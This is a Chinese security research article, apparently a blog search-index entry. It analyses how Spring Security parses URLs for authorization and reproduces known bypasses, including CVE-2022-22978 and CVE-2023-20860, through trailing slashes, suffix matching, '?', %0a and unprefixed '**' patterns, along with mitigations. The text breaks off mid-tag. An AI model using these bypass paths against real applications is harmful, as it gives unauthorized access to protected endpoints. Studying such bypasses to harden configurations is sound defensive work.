<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>URL解析导致的鉴权绕过问题探究-SpringSecurity篇</title>
    <link href="/2023/from-urlparser-to-authbypass-SpringSecurity/"/>
    <url>/2023/from-urlparser-to-authbypass-SpringSecurity/</url>
    
    <content type="html"><![CDATA[<p>上篇文章中分析了Resin解析URL的流程和解析过程中存在的绕过技巧。本文则主要分析Spring生态中的核心鉴权框架-Spring Security，研究了其鉴权解析流程、用于匹配鉴权的RequestMatcher实例类的逻辑、可能存在鉴权绕过的场景，复现分析了由于Spring Security与多个后端框架（SpringMVC、自写Servlet、SpringWebflux）解析不一致而导致的鉴权绕过漏洞。在分析过程中也发现了公网未提到的几个绕过场景， 如果对文章有疑问&#x2F;建议或者想一起研究交流的师傅，欢迎私信~ </p><h2 id="1、Spring-Security-解析过程"><a href="#1、Spring-Security-解析过程" class="headerlink" title="1、Spring Security 解析过程"></a>1、Spring Security 解析过程</h2><p>解析过程基于的是spring-security 5.6.3版本</p><p>真实情况是最开始从org.apache.catalina.core.ApplicationFilterChain#doFilter开始解析，这部分属于tomcat的解析逻辑，一直到org.springframework.security.web.FilterChainProxy#doFilter就属于了spring security的范畴。在当前类的doFilterInternal方法中，调用spring security的HttpFirewall接口进行恶意字符的校验</p><p>HttpFirewall接口有2个实现类：DefaultHttpFirewall、StrictHttpFirewall（严格模式）</p><p>spring security默认使用的就是StrictHttpFirewall严格模式的校验</p><p><img src="/img/from-urlparser-to-authbypass-SpringSecurity/1.png"></p><p>依次来看下：</p><p>1、rejectForbiddenHttpMethod  校验请求方法，如果请求方法不在默认的这7个方法中，会报错RequestRejectedException</p><p><img src="/img/from-urlparser-to-authbypass-SpringSecurity/2.png"></p><p>2、rejectedBlocklistedUrls  这个方法会对url内容进行检查。如果url中包含特殊字符，那么会报错不再执行后续逻辑</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs gradle">decode:request.getServletPath()没包含的话，就检查request.getPathInfo()    经过归一化处理的字符串<br>encode:request.getContextPath()没包含的话，就检查request.getRequestURI()  直接传递的字符串<br><br>如请求<span class="hljs-regexp">/hello/</span>.<span class="hljs-regexp">/../</span>test2<br>request.getRequestURI() == <span class="hljs-regexp">/hello/</span>.<span class="hljs-regexp">/../</span>test2<br>request.getContextPath() == <span class="hljs-string">&quot;&quot;</span><br><br>request.getPathInfo()   ==  <span class="hljs-keyword">null</span><br>request.getServletPath() == test<br></code></pre></td></tr></table></figure><p>主要限制了：</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-number">1</span>、编码列表：<br>分号<span class="hljs-comment">; %3b %3B</span><br>反斜杠\ <span class="hljs-variable">%5</span><span class="hljs-keyword">c</span> <span class="hljs-variable">%5</span>C<br>双斜杠// <span class="hljs-variable">%2</span>f<span class="hljs-variable">%2</span>f <span class="hljs-variable">%2</span>f<span class="hljs-variable">%2</span>F <span class="hljs-variable">%2</span>F<span class="hljs-variable">%2</span>f <span class="hljs-variable">%2</span>F<span class="hljs-variable">%2</span>F<br><span class="hljs-variable">%25</span>(%)<br><span class="hljs-variable">%2</span>f <span class="hljs-variable">%2</span>F(/)<br><span class="hljs-variable">%2</span>e <span class="hljs-variable">%2</span>E(.)<br><span class="hljs-variable">%00</span><br>空字符<br><br><span class="hljs-number">2</span>、未编码列表：<br>分号<span class="hljs-comment">; %3b %3B</span><br>反斜杠\ <span class="hljs-variable">%5</span><span class="hljs-keyword">c</span> <span class="hljs-variable">%5</span>C<br>双斜杠// <span class="hljs-variable">%2</span>f<span class="hljs-variable">%2</span>f <span class="hljs-variable">%2</span>f<span class="hljs-variable">%2</span>F <span class="hljs-variable">%2</span>F<span class="hljs-variable">%2</span>f <span class="hljs-variable">%2</span>F<span class="hljs-variable">%2</span>F<br>百分号%<br><span class="hljs-variable">%2</span>f <span class="hljs-variable">%2</span>F(/)<br><span class="hljs-variable">%00</span><br>空字符<br></code></pre></td></tr></table></figure><p>对于请求路径&#x2F;hello&#x2F;.&#x2F;..&#x2F;test2来说，filterchain调用rejectedBlocklistedUrls时并不会报错，但是会在后面的isNormalized 方法中报错</p><p><img src="/img/from-urlparser-to-authbypass-SpringSecurity/3.png"></p><p>&#x2F;hello&#x2F;%2e&#x2F;test2 访问时</p><p><img src="/img/from-urlparser-to-authbypass-SpringSecurity/4.png"></p><p>当然，如果系统本身业务确实需要传入限制字符，也可以调用方法去除限制：StrictHttpFirewall#setAllowSemicolon设置为true表示允许;出现、setAllowUrlEncodedPeriod设置%2e、setAllowUrlEncodedDoubleSlash设置&#x2F;&#x2F;字符</p><p>3、rejectedUntrustedHosts  默认为true</p><p>4、isNormalized  对4个地址进行处理，如果返回false 那么请求就会报错：The request was rejected because the URL was not normalized.</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">request.get<span class="hljs-constructor">RequestURI()</span><br>request.get<span class="hljs-constructor">ContextPath()</span><br>request.get<span class="hljs-constructor">ServletPath()</span><br>request.get<span class="hljs-constructor">PathInfo()</span><br></code></pre></td></tr></table></figure><p>如果包含<code>/. /.. </code>字符，说明路径未规范化，那么会报错</p><p><img src="/img/from-urlparser-to-authbypass-SpringSecurity/5.png"></p><p><img src="/img/from-urlparser-to-authbypass-SpringSecurity/6.png"></p><p>5、containsOnlyPrintableAsciiCharacters 查看<code>request.getRequestURI()</code>是否包含非ascii字符</p><p><img src="/img/from-urlparser-to-authbypass-SpringSecurity/7.png"></p><p>另外一个 DefaultHttpFirewall相对严格模式的StrictHttpFirewall 而言逻辑很简单，在getFirewalledRequest方法中：1、调用isNormalized 检查ServletPath跟PathInfo的归一化;   2、调用containsInvalidUrlEncodedSlash检查RequestURI是否包含%2f(&#x2F;)</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs gradle">如请求<span class="hljs-regexp">/hello/</span>.<span class="hljs-regexp">/../</span>test2<br>request.getRequestURI() == <span class="hljs-regexp">/hello/</span>.<span class="hljs-regexp">/../</span>test2<br>request.getContextPath() == <span class="hljs-string">&quot;&quot;</span><br><br>request.getPathInfo()   ==  <span class="hljs-keyword">null</span><br>request.getServletPath() == test<br></code></pre></td></tr></table></figure><p><img src="/img/from-urlparser-to-authbypass-SpringSecurity/8.png"></p><h2 id="2、Spring-Security-RequestMatcher匹配及绕过"><a href="#2、Spring-Security-RequestMatcher匹配及绕过" class="headerlink" title="2、Spring Security RequestMatcher匹配及绕过"></a>2、Spring Security RequestMatcher匹配及绕过</h2><p>RequestMatcher接口的实现类用于匹配请求url是否符合系统定义的匹配规则，如果match方法返回true表示匹配 需要认证。</p><p><strong>下文提到的鉴权绕过问题 总的来说就是Spring Security与后端框架对于url pattern的解析不一致导致RequestMatcher#match匹配不到请求路由 返回false，但是后端却能将路由解析到具体方法的情况</strong></p><p>Spring Security历史上出现的绕过问题多是这样的情况，如CVE-2023-34034 是与Spring WebFlux组合时的绕过、CVE-2023-34035 是与自写Servlet组合时的绕过、CVE-2023-20873 是与Cloud Foundry组合时的绕过、CVE-2022-22978 RegexRequestMatcher、CVE-2023-20860 mvcRequestMatcher 是与spring mvc组合时正则.默认不匹配换行符、 无前缀的通配符无法正确匹配路由的问题。</p><p>如下是几个重点的RequestMatcher鉴权类及一些鉴权绕过的细节分析</p><h3 id="2-1-AntPathRequestMatcher"><a href="#2-1-AntPathRequestMatcher" class="headerlink" title="2.1 AntPathRequestMatcher"></a>2.1 AntPathRequestMatcher</h3><p>AntPathRequestMatcher#matches  </p><p><img src="/img/from-urlparser-to-authbypass-SpringSecurity/9.png"></p><p>首先判断鉴权配置方法与用户传入的方法是否一致，如果不一致，返回false 放过鉴权；如果正则为<code>/**</code>，那么返回true；如果不是<code>/**</code>，那么调用AntPathRequestMatcher#getRequestPath获取url后进行matcher匹配。根据系统设置的过滤规则，matcher分为SpringAntMatcher、SubpathMatcher，在实例化AntPathRequestMatcher对象时就会指定matcher到底是哪一个，如果pattern满足条件：不为<code>/**</code>、不为<code>**</code>、以<code>/**</code> 结尾、且不包含 <code>? &#123; &#125;</code> 这三种字符、倒数第二个位置的字符是<code>*</code>，则创建一个 SubpathMatcher 对象，否则指定为SpringAntMatcher对象</p><p><img src="/img/from-urlparser-to-authbypass-SpringSecurity/10.png"></p><p>实例配置如下，spring security就会创建SubpathMatcher进行匹配</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs scala">com.example.springsecurity.config.<span class="hljs-type">SecurityConfig</span><br><br><span class="hljs-meta">@Configuration</span><br><span class="hljs-meta">@EnableWebSecurity</span><br>public <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SecurityConfig</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">WebSecurityConfigurerAdapter</span></span>&#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> void configure(<span class="hljs-type">HttpSecurity</span> httpSecurity) <span class="hljs-keyword">throws</span> <span class="hljs-type">Exception</span> &#123;<br>        httpSecurity.authorizeRequests().antMatchers(<span class="hljs-string">&quot;/hello/**&quot;</span>).authenticated();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>SubpathMatcher#matches，区分大小写开关caseSensitive(默认为true)，然后将用户传入的path与subpath进行比对，subpath是pattern.substring(0, pattern.length() - 3)，即本次演示的&#x2F;hello</p><p><img src="/img/from-urlparser-to-authbypass-SpringSecurity/11.png"></p><p>如果path与subpath相同，或者以subpath开头、后面紧跟着&#x2F;，那么会鉴权，返回403</p><p><img src="/img/from-urlparser-to-authbypass-SpringSecurity/12.png"></p><p>如果配置是&#x2F;hello&#x2F;test2，那么使用SpringAntMatcher进行匹配判断</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs scala"><span class="hljs-meta">@Configuration</span><br><span class="hljs-meta">@EnableWebSecurity</span><br>public <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SecurityConfig</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">WebSecurityConfigurerAdapter</span></span>&#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> void configure(<span class="hljs-type">HttpSecurity</span> httpSecurity) <span class="hljs-keyword">throws</span> <span class="hljs-type">Exception</span> &#123;<br>        httpSecurity.authorizeRequests().antMatchers(<span class="hljs-string">&quot;/hello/test2&quot;</span>).authenticated();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/from-urlparser-to-authbypass-SpringSecurity/13.png"></p><h3 id="2-2-AntPathRequestMatcher-绕过"><a href="#2-2-AntPathRequestMatcher-绕过" class="headerlink" title="2.2 AntPathRequestMatcher 绕过"></a>2.2 AntPathRequestMatcher 绕过</h3><p><strong>spring mvc trailingSlashMatch 属性绕过</strong></p><p>当spring security对后端的spring mvc controller进行鉴权时，由于spring mvc的trailingSlashMatch配置属性默认为true，会认为&#x2F;hello&#x2F;test2&#x2F;与&#x2F;hello&#x2F;test2 相同，都能定位到具体业务方法。但是spring security会认为这是两个url，所以当配置对&#x2F;hello&#x2F;test2鉴权时，用户可以使用&#x2F;hello&#x2F;test2&#x2F;进行绕过</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs scala"><span class="hljs-meta">@Configuration</span><br><span class="hljs-meta">@EnableWebSecurity</span><br>public <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SecurityConfig</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">WebSecurityConfigurerAdapter</span></span>&#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> void configure(<span class="hljs-type">HttpSecurity</span> httpSecurity) <span class="hljs-keyword">throws</span> <span class="hljs-type">Exception</span> &#123;<br>        httpSecurity.authorizeRequests().antMatchers(<span class="hljs-string">&quot;/hello/test2&quot;</span>).authenticated();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>访问&#x2F;hello&#x2F;test2 需要鉴权</p><p><img src="/img/from-urlparser-to-authbypass-SpringSecurity/14.png"></p><p>访问&#x2F;hello&#x2F;test2&#x2F; 绕过鉴权</p><p><img src="/img/from-urlparser-to-authbypass-SpringSecurity/15.png"></p><p>这种绕过方式最早(不完全考证)由landgrey师傅报送官方，但是官方回应文档已建议使用MvcRequestMatcher替代AntPathRequestMatcher，没发布专门的安全公告</p><p><a href="https://landgrey.me/blog/23/">https://landgrey.me/blog/23/</a></p><p><a href="https://docs.spring.io/spring-security/site/docs/5.5.0/reference/html5/#MvcRequestMatcher">https://docs.spring.io/spring-security/site/docs/5.5.0/reference/html5/#MvcRequestMatcher</a></p><p><strong>spring mvc SuffixPatternMatch 后缀匹配模式绕过</strong></p><p>当spring security对后端的spring mvc controller进行鉴权时，如果启用了SuffixPatternMatch 后缀匹配模式，&#x2F;hello&#x2F;test2与&#x2F;hello&#x2F;test2.do 的匹配结果是一样的。但是spring mvc在5.3及之后的版本将 RequestMappingHandlerMapping#useSuffixPatternMatch 默认值true改为了false，所以此绕过方式适用于spring mvc &lt;5.3</p><p><a href="https://github.com/spring-projects/spring-framework/issues/23915">https://github.com/spring-projects/spring-framework/issues/23915</a></p><p><img src="/img/from-urlparser-to-authbypass-SpringSecurity/16.png"></p><p><img src="/img/from-urlparser-to-authbypass-SpringSecurity/17.png"></p><p>在国产系统蓝*就出现过这个问题，该系统使用了低版本的spring mvc 5.0.19，useSuffixPatternMatch默认为true，支持后缀匹配。同时此系统在spring.xml进行权限配置时，判断gif、jpg、tmpl等结尾的路由是静态资源，默认不经过系统安全鉴权</p><p><img src="/img/from-urlparser-to-authbypass-SpringSecurity/18.png"></p><p>这样利用SuffixPatternMatch 后缀匹配的特性，访问&#x2F;xx&#x2F;target.tmpl(不需要权限)达到与&#x2F;xx&#x2F;target(需要权限)相同的效果，从而<strong>绕过spring secutiry的鉴权</strong></p><p>低版本关闭SuffixPatternMatch 的方法</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-number">1</span>、调用setUseSuffixPatternMatch<br><span class="hljs-meta">@Configuration</span><br><span class="hljs-meta">@ComponentScan</span><br><span class="hljs-meta">@EnableWebMvc</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AppConfig</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">WebMvcConfigurer</span> &#123;<br>  <span class="hljs-meta">@Override</span><br>  <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">configurePathMatch</span>(<span class="hljs-params">PathMatchConfigurer configurer</span>) &#123;<br>      configurer.<span class="hljs-title function_">setUseSuffixPatternMatch</span>(<span class="hljs-literal">false</span>);<br>  &#125;<br>&#125;<br><br><br><span class="hljs-number">2</span>、配置文件中annotation-driven标签配置：<br>  &lt;<span class="hljs-attr">mvc</span>:annotation-driven&gt;<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">mvc:path-matching</span> <span class="hljs-attr">suffix-pattern</span>=<span class="hljs-string">&quot;false&quot;</span> /&gt;</span></span><br>  &lt;/<span class="hljs-attr">mvc</span>:annotation-driven&gt;<br></code></pre></td></tr></table></figure><h3 id="2-3-RegexRequestMatcher"><a href="#2-3-RegexRequestMatcher" class="headerlink" title="2.3 RegexRequestMatcher"></a>2.3 RegexRequestMatcher</h3><p>RegexRequestMatcher#matches方法根据正则模式进行匹配，如果是正常的请求方法，会获取servletpath 调用java.util.regex.Pattern#matcher进行正则表达式匹配</p><p><img src="/img/from-urlparser-to-authbypass-SpringSecurity/19.png"></p><p>使用如下权限配置，&#x2F;hello&#x2F;下的路径都需要经过认证</p><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs aspectj"><span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">configure</span><span class="hljs-params">(HttpSecurity httpSecurity)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        httpSecurity.authorizeRequests().regexMatchers(<span class="hljs-string">&quot;/hello/.*&quot;</span>).authenticated();<br>    &#125;<br></code></pre></td></tr></table></figure><h3 id="2-4-RegexRequestMatcher绕过"><a href="#2-4-RegexRequestMatcher绕过" class="headerlink" title="2.4 RegexRequestMatcher绕过"></a>2.4 RegexRequestMatcher绕过</h3><p>当使用RegexRequestMatcher配置校验固定路径、<code>/.*</code>、&#x2F;<code>*</code>等时，可使用?字符进行绕过</p><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs aspectj"><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">configure</span><span class="hljs-params">(HttpSecurity httpSecurity)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>httpSecurity.authorizeRequests().regexMatchers(<span class="hljs-string">&quot;/hello/test2&quot;</span>).authenticated();<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/from-urlparser-to-authbypass-SpringSecurity/20.png"></p><p>&#x2F;hello&#x2F;test2?</p><p><img src="/img/from-urlparser-to-authbypass-SpringSecurity/21.png"></p><p><img src="/img/from-urlparser-to-authbypass-SpringSecurity/22.png"></p><h3 id="2-5-RegexRequestMatcher-绕过-CVE-2022-22978"><a href="#2-5-RegexRequestMatcher-绕过-CVE-2022-22978" class="headerlink" title="2.5 RegexRequestMatcher 绕过 CVE-2022-22978"></a>2.5 RegexRequestMatcher 绕过 CVE-2022-22978</h3><p>RegexRequestMatcher#pattern默认的匹配模式不匹配\r \n换行符，所以当配置校验是<code>/hello/.*</code>时，可使用<code>/hello/test2%0a</code>绕过</p><p>修复的commit： <a href="https://github.com/spring-projects/spring-security/commit/70863952aeb9733499027714d38821db05654856">https://github.com/spring-projects/spring-security/commit/70863952aeb9733499027714d38821db05654856</a></p><p>在默认情况下，正则表达式中的.不会匹配换行符。而修复后的Pattern.DOTALL模式是单行模式：更改了.的含义，使它与每个字符都匹配，包括换行符\r \n</p><p><img src="/img/from-urlparser-to-authbypass-SpringSecurity/23.png"></p><p>常量值参考：<a href="https://docs.oracle.com/javase/8/docs/api/constant-values.html">https://docs.oracle.com/javase/8/docs/api/constant-values.html</a></p><h3 id="2-6-MvcRequestMatcher"><a href="#2-6-MvcRequestMatcher" class="headerlink" title="2.6 MvcRequestMatcher"></a>2.6 MvcRequestMatcher</h3><p>早期的spring security默认使用AntPathRequestMatcher匹配鉴权，AntPathRequestMatcher与spring mvc HandlerMappingIntrospector匹配路由的解析差异 导致鉴权&#x2F;index被 &#x2F;index&#x2F;, &#x2F;index.html 绕过。为此官方新增了MvcRequestMatcher类，改为与后端spring mvc一致的HandlerMappingIntrospector类匹配路径</p><p><img src="/img/from-urlparser-to-authbypass-SpringSecurity/24.png"></p><p>鉴权匹配的起点是org.springframework.security.web.servlet.util.matcher.MvcRequestMatcher#matches</p><p><img src="/img/from-urlparser-to-authbypass-SpringSecurity/25.png"></p><p>该方法主要操作有两步：1是根据用户请求的url获取处理的HandlerMapping实例类；2是根据第一步获取的HandlerMapping#parser解析器解析规则pattern，再进行路由url与规则pattern的匹配工作</p><p>1、根据url获取对应的MatchableHandlerMapping实例类，这里获取的是PathPatternMatchableHandlerMapping</p><p>HandlerMappingIntrospector#doWithMatchingMapping依次遍历handlerMappings，调用其getHandler方法后将返回结果传递给PathSettingHandlerMapping并返回</p><p><img src="/img/from-urlparser-to-authbypass-SpringSecurity/26.png"></p><p>handlerMappings有5个，依次遍历。第一个是RequestMappingHandlerMapping，不存在getHandler，所以会一直调用到爷爷类AbstractHandlerMethodMapping#getHandlerInternal，其调用的lookupHandlerMethod方法返回的HandlerMethod实例是具体处理该路由的hander方法（Controller中定义的方法）</p><p><img src="/img/from-urlparser-to-authbypass-SpringSecurity/27.png"></p><p>而且doWithMatchingMapping方法这里是个lambda表达式，在方法中执行apply方法时会执行{}内的逻辑代码</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">return (MatchableHandlerMapping)this.<span class="hljs-keyword">do</span><span class="hljs-constructor">WithMatchingMapping(<span class="hljs-params">wrappedRequest</span>, <span class="hljs-params">false</span>, (<span class="hljs-params">matchedMapping</span>, <span class="hljs-params">executionChain</span>)</span> -&gt; &#123;<br>            <span class="hljs-comment">//逻辑代码</span><br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/from-urlparser-to-authbypass-SpringSecurity/28.png"></p><p>最终根据获取到的mapping及requestPath路径组装HandlerMappingIntrospector.PathSettingHandlerMapping实例并返回，接着执行match方法</p><p>2、调用PathPatternMatchableHandlerMapping#match进行匹配，分为两步：</p><p>第一步调用PathPatternParser#parse解析系统配置的鉴权正则pattern，处理了<code>/ ? &#123; &#125; : *</code>这几个字符出现在pattern的情况，根据&#x2F;将正则pattern拆分得到多个对应的PathElement实例集合，最终返回PathPattern实例</p><p>第二步调用PathPattern#matches开始真正的匹配工作：遍历上一步得到的PathElement实例节点，调用对应的pathElements实例match方法进行匹配</p><p><img src="/img/from-urlparser-to-authbypass-SpringSecurity/29.png"></p><p>其他类型规则的PathElement实例</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs awk">分离器元素  SeparatorPathElement（/）<br>通配符元素     WildcardPathElement（<span class="hljs-regexp">/api/</span>*）<br>单字符通配符元素 SingleCharWildcardedPathElement（<span class="hljs-regexp">/api/</span>?）<br>统配剩余路径元素 WildcardTheRestPathElement（<span class="hljs-regexp">/api/</span>**）<br>将路径作为变量捕获的元素 CaptureVariablePathElement（<span class="hljs-regexp">/api/</span>&#123;param&#125;）<br>捕获路径其余部分的元素 CaptureTheRestPathElement（<span class="hljs-regexp">/api/</span>&#123;*param&#125;）<br>字面路径元素  LiteralPathElement（<span class="hljs-regexp">/api/i</span>ndex）<br>正则表达式元素 RegexPathElement（<span class="hljs-regexp">/api/</span>.*）<br></code></pre></td></tr></table></figure><p>第一步，如果权限匹配规则是**，最终返回的PathPattern实例</p><p><img src="/img/from-urlparser-to-authbypass-SpringSecurity/30.png"></p><p>第二步接着调用PathPattern#matches开始真正的匹配工作：依次根据上一步获取的PathElement进行匹配</p><p><img src="/img/from-urlparser-to-authbypass-SpringSecurity/31.png"></p><p>**对应的PathElement实例是RegexPathElement，所以会调用匹配到的是RegexPathElement#matches</p><p><img src="/img/from-urlparser-to-authbypass-SpringSecurity/32.png"></p><h3 id="2-7-MvcRequestMatcher-绕过-CVE-2023-20860"><a href="#2-7-MvcRequestMatcher-绕过-CVE-2023-20860" class="headerlink" title="2.7 MvcRequestMatcher 绕过 CVE-2023-20860"></a>2.7 MvcRequestMatcher 绕过 CVE-2023-20860</h3><p>在23年3月份，Spring官方发布了一份cve-2023-20860安全通告，表示MvcRequestMatcher 在使用无前缀双通配符(**)的情况下，会存在Spring Security与Spring MVC的解析逻辑不一致导致的绕过</p><p>CVE-2023-20860官方公告链接：<a href="https://spring.io/security/cve-2023-20860">https://spring.io/security/cve-2023-20860</a></p><p>影响版本： Spring Framework 6.0.0 to 6.0.6、5.3.0    本地测试复现版本：5.3.24</p><p><img src="/img/from-urlparser-to-authbypass-SpringSecurity/33.png"></p><p>开发者通常会认为**表示全路径，在使用Spring Security的mvcMatchers鉴权时，可能会使用如下配置规则</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs scala"><span class="hljs-meta">@Configuration</span><br><span class="hljs-meta">@EnableWebSecurity</span><br>public <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SecurityConfig</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">WebSecurityConfigurerAdapter</span></span>&#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> void configure(<span class="hljs-type">HttpSecurity</span> httpSecurity) <span class="hljs-keyword">throws</span> <span class="hljs-type">Exception</span> &#123;<br>        httpSecurity.authorizeRequests().mvcMatchers(<span class="hljs-string">&quot;**&quot;</span>).authenticated();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>控制器HelloController</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-meta">@RestController</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloController</span> &#123;<br>    <span class="hljs-meta">@GetMapping</span>(<span class="hljs-string">&quot;/hello/test2&quot;</span>)<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">test2</span>(<span class="hljs-params"></span>)&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;test2 page&quot;</span>;<br>    &#125;<br>    <span class="hljs-meta">@GetMapping</span>(<span class="hljs-string">&quot;test3&quot;</span>)<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">test1</span>(<span class="hljs-params"></span>)&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;test3 page&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>按照平常思维理解，**鉴权表示对任意路径进行鉴权。但是实际测试发现访问&#x2F;hello&#x2F;test2、&#x2F;test3 都不需要进行鉴权，这里的鉴权是失效的</p><p><img src="/img/from-urlparser-to-authbypass-SpringSecurity/34.png"></p><p><img src="/img/from-urlparser-to-authbypass-SpringSecurity/35.png"></p><p>绕过的核心本质在于：MvcRequestMatcher对于pattern规则的解析与spring webmvc对于无前缀url的解析不一致导致的绕过问题</p><p>对于spring controller而言，如下两个的路由是等价的</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-variable">@GetMapping</span>(<span class="hljs-string">&quot;/hello/*&quot;</span>)<br><span class="hljs-variable">@GetMapping</span>(<span class="hljs-string">&quot;hello/*&quot;</span>)<br></code></pre></td></tr></table></figure><p>但是对于spring security的MvcRequestMatcher使用的PathPattern来说，并不等价。所以当正则不以&#x2F;开头时，是匹配不到&#x2F;hello&#x2F;test2路由的</p><p><img src="/img/from-urlparser-to-authbypass-SpringSecurity/36.png"></p><p>MvcRequestMatcher使用PathPattern对鉴权正则pattern与请求路由url两者是否匹配进行判断，而PathPattern根据不同的pattern会选择不同的PathElement实例处理</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs markdown">当匹配规则为/<span class="hljs-strong">**时，对应的PathElement是WildcardTheRestPathElement</span><br><span class="hljs-strong">当匹配规则为**</span>时，对应的PathElement是RegexPathElement<br></code></pre></td></tr></table></figure><p><img 